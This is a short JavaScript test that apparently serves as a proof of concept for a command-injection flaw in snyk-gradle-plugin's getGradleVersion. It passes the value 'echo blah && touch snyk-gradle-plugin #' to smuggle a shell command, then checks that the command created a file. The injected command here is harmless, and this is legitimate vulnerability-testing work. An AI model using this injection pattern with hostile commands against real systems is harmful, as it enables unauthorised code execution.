test("Remote code execution for snyk-gradle-plugin", (done) => {
  const fs = require('fs');
  const { getGradleVersion } = require('snyk-gradle-plugin');

  let path = './snyk-gradle-plugin';
  if (fs.existsSync(path))
    fs.unlinkSync(path)

  var file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  getGradleVersion(process.cwd(), "echo blah && touch snyk-gradle-plugin #").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, (err) => { done(); });
  });
});
